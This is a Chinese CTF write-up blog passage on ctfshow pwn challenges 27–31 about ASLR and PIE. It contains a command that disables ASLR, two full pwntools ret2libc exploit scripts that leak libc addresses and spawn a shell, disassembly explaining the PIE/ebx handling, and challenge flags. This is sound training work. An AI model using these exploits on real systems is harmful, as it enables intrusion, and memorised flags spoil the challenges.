<h1 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h1><p>代码：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure><br>再运行pwn可执行文件，得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560_0x603260&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h1><p>直接运行即可得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h1><p>确保ASLR保护码为2，直接运行可得答案：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h1><p>我甚至是直接用pwn25的payload小改一下就做出来了。</p>
<a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">ctfshow-pwn25-WP</a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28308&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(put_plt) + p32(main_addr) + p32(put_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_v = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc_v.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc_v.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc_v.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>flag:<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;9f1c6270-f24b-4f94-ac8d-33cbd59d64a6&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h1><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">前置知识：pwn25的WP</a>
<p>本wp主要讲解二者差别。</p>
<p>先给出payload。</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn31&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28308&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_real_addr = <span class="built_in">int</span>(r.recv().strip(), <span class="number">16</span>)</span><br><span class="line">main_ori_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_offset = main_real_addr - main_ori_addr</span><br><span class="line"></span><br><span class="line">puts_real_plt = addr_offset + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_real_got = addr_offset + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ctfshow_real_addr = addr_offset + elf.symbols[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">132</span> * <span class="string">b&#x27;a&#x27;</span> + p32(addr_offset + <span class="number">0x1fc0</span>) + <span class="number">4</span> * <span class="string">b&#x27;a&#x27;</span> + p32(puts_real_plt) + p32(main_real_addr) + p32(puts_real_got)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">l = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_real_addr)</span><br><span class="line"></span><br><span class="line">l_base = puts_real_addr - l.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_real_addr = l_base + l.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_real_addr = l_base + l.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">140</span> * <span class="string">b&#x27;a&#x27;</span> + p32(system_real_addr) + p32(main_real_addr) + p32(bin_sh_real_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="两题的差别"><a href="#两题的差别" class="headerlink" title="两题的差别"></a>两题的差别</h2><p>两题的差别主要在于pwn31打开了PIE，这带来了payload中两部分的不同：</p>
<ol>
<li>我们必须通过程序泄露的真实地址来确定PIE导致的偏移量（基地址），并且后续的函数的真实地址也必须加上基地址。</li>
<li>我们的payload串构造不同，其中第133-136位我们填入了特殊值。</li>
</ol>
<p>下面主要讲解第2点，主要是我对第二点感到困惑。</p>
<h3 id="第2点不同"><a href="#第2点不同" class="headerlink" title="第2点不同"></a>第2点不同</h3><h4 id="ebx真正发挥了作用"><a href="#ebx真正发挥了作用" class="headerlink" title="ebx真正发挥了作用"></a><code>ebx</code>真正发挥了作用</h4><p>133-136位其实在两题的代码中一直都有特殊意义，因为根据函数反汇编，都在<code>ctfshow</code>函数的最后有：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8048526:       8b 5d fc                mov    -0x4(%ebp),%ebx</span><br></pre></td></tr></table></figure><br>将栈中的一个4字节数（前面提到的133-136位）赋给了寄存器<code>ebx</code>。</p>
<p>尽管这个赋值动作是共有的，但是具体的区别其实在寄存器<code>ebx</code>是否被真正运用上。</p>
<p><code>ebx</code>这个寄存器一般被用于存储基地址。</p>
<p>这是pwn25题目中程序在<code>.plt</code>部分的代码：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:       ff 35 04 a0 04 08       push   0x804a004</span><br><span class="line"> 8048376:       ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 804837c:       00 00                   add    %al,(%eax)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:       ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 8048386:       68 00 00 00 00          push   $0x0</span><br><span class="line"> 804838b:       e9 e0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:       ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 8048396:       68 08 00 00 00          push   $0x8</span><br><span class="line"> 804839b:       e9 d0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:       ff 25 14 a0 04 08       jmp    *0x804a014</span><br><span class="line"> 80483a6:       68 10 00 00 00          push   $0x10</span><br><span class="line"> 80483ab:       e9 c0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:       ff 25 18 a0 04 08       jmp    *0x804a018</span><br><span class="line"> 80483b6:       68 18 00 00 00          push   $0x18</span><br><span class="line"> 80483bb:       e9 b0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:       ff 25 1c a0 04 08       jmp    *0x804a01c</span><br><span class="line"> 80483c6:       68 20 00 00 00          push   $0x20</span><br><span class="line"> 80483cb:       e9 a0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt.got:</span><br><span class="line"></span><br><span class="line">080483d0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80483d0:       ff 25 f4 9f 04 08       jmp    *0x8049ff4</span><br><span class="line"> 80483d6:       66 90                   xchg   %ax,%ax</span><br></pre></td></tr></table></figure><br>可以看到直接jmp了一个地址。</p>
<p>再看pwn31中<code>.plt</code>部分的代码：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">00000460 &lt;.plt&gt;:</span><br><span class="line"> 460:   ff b3 04 00 00 00       push   0x4(%ebx)</span><br><span class="line"> 466:   ff a3 08 00 00 00       jmp    *0x8(%ebx)</span><br><span class="line"> 46c:   00 00                   add    %al,(%eax)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">00000470 &lt;read@plt&gt;:</span><br><span class="line"> 470:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)</span><br><span class="line"> 476:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 47b:   e9 e0 ff ff ff          jmp    460 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">00000480 &lt;printf@plt&gt;:</span><br><span class="line"> 480:   ff a3 10 00 00 00       jmp    *0x10(%ebx)</span><br><span class="line"> 486:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 48b:   e9 d0 ff ff ff          jmp    460 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">00000490 &lt;puts@plt&gt;:</span><br><span class="line"> 490:   ff a3 14 00 00 00       jmp    *0x14(%ebx)</span><br><span class="line"> 496:   68 10 00 00 00          push   $0x10</span><br><span class="line"> 49b:   e9 c0 ff ff ff          jmp    460 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">000004a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 4a0:   ff a3 18 00 00 00       jmp    *0x18(%ebx)</span><br><span class="line"> 4a6:   68 18 00 00 00          push   $0x18</span><br><span class="line"> 4ab:   e9 b0 ff ff ff          jmp    460 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">000004b0 &lt;write@plt&gt;:</span><br><span class="line"> 4b0:   ff a3 1c 00 00 00       jmp    *0x1c(%ebx)</span><br><span class="line"> 4b6:   68 20 00 00 00          push   $0x20</span><br><span class="line"> 4bb:   e9 a0 ff ff ff          jmp    460 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">000004c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 4c0:   ff a3 20 00 00 00       jmp    *0x20(%ebx)</span><br><span class="line"> 4c6:   68 28 00 00 00          push   $0x28</span><br><span class="line"> 4cb:   e9 90 ff ff ff          jmp    460 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><br>可以看到，<code>ebx</code>这个寄存器真正地发挥了作用。</p>
<p><strong>不难发现：<code>ebx</code>寄存器中存储的就是<code>.got</code>表的基地址</strong>，这点读者可以自己自行验证，手动做做加法。</p>
<h4 id="一个顺手给的验证"><a href="#一个顺手给的验证" class="headerlink" title="一个顺手给的验证"></a>一个顺手给的验证</h4><p>顺便给出程序中一个手动验证<code>ebx</code>的地方，在<code>ctfshow</code>的函数地址中：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">627:   e8 9b 01 00 00          call   7c7 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">62c:   05 94 19 00 00          add    $0x1994,%eax</span><br><span class="line">631:   83 ec 04                sub    $0x4,%esp</span><br><span class="line">634:   68 00 01 00 00          push   $0x100</span><br><span class="line">639:   8d 95 78 ff ff ff       lea    -0x88(%ebp),%edx</span><br><span class="line">63f:   52                      push   %edx</span><br><span class="line">640:   6a 00                   push   $0x0</span><br><span class="line">642:   89 c3                   mov    %eax,%ebx</span><br><span class="line">644:   e8 27 fe ff ff          call   470 &lt;read@plt&gt;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>其中，<code>&lt;__x86.get_pc_thunk.&#123;某个字母&#125;x&gt;</code>会返回下一条指令的地址（利用函数调用时会自动往栈中推入一个下一行代码地址作为返回地址的特点）给寄存器<code>e&#123;某个字母&#125;x</code>。<br>所以调用完后<code>eax</code>的值为<code>0x627+程序基地址</code>。</li>
<li>然后程序给<code>eax</code>加上了一个偏移量<code>0x1994</code>，那么<code>eax</code>此时的值为<code>0x1fc0+程序基地址</code>，这其实就是此时<code>.got</code>表的真实基地址。</li>
<li>在调用<code>&lt;read@plt&gt;</code>前，<code>eax</code>的值被付给了<code>ebx</code>，此时<code>ebx</code>寄存器中的值就是<code>.got</code>表的真实基地址。</li>
</ol>
<h4 id="payload串更改的理由"><a href="#payload串更改的理由" class="headerlink" title="payload串更改的理由"></a>payload串更改的理由</h4><p>因为我们是先输入溢出字符串，然后才是程序将<code>-0x4(%ebp)</code>（也就是前文的133-136位）中的值赋给<code>ebx</code>，然后才是<code>ret</code>指令将程序跳至我们要的函数。</p>
<p>此时，因为<code>ebx</code>真的发挥了作用，我们不得不将<code>-0x4(%ebp)</code>（也就是前文的133-136位）在payload中输出为真实的<code>.got</code>表地址，也就是实际上不改变这4字节栈中的值，来确保我们后续过程中，<code>ret</code>指令后能正确地通过<code>.plt</code>表转到我们需要的<code>puts</code>函数中。</p>
<p>所以第二次我们不再麻烦，因为我们已经获取了<code>system</code>函数和<code>bin/sh</code>字符串的真实地址，不再经由<code>.plt</code>表跳转，也就不在介意<code>ebx</code>寄存器了。</p>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;3df9bce0-290d-47be-9d73-e591295b38b3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>ASLR</tag>
        <tag>wp</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
</search>
